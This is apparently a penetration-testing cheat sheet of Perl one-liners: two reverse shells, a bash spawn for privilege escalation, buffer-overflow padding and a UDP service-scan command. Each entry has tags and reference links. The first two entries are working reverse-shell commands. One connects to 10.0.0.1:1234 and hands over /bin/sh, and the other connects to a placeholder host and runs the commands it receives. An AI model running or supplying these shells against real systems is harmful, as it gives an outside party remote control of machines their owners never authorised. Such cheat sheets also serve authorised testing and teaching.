### 1. perl reverse shell
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
**- linux,reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 2. perl windows reverse shell
```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[me]:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
**- reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 3. perl spawn bash
```
perl -e 'exec "/bin/bash";'
```
**- perl,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 4. Repeat A x times pipe into where you think the overflow location is, look for 0x41's
```
perl -e 'print "A"x10000; print "\n"'
```
**- perl,buffer overflow**
#### References:

http://stackoverflow.com/questions/277485/how-can-i-repeat-a-string-n-times-in-perl
https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit
__________
### 5. Quick and dirty UDP service discovery
```
udp-proto-scanner.pl -f [FileOfIP]
```
**- perl,snmp**
#### References:

http://labs.portcullis.co.uk/application/udp-proto-scanner
__________
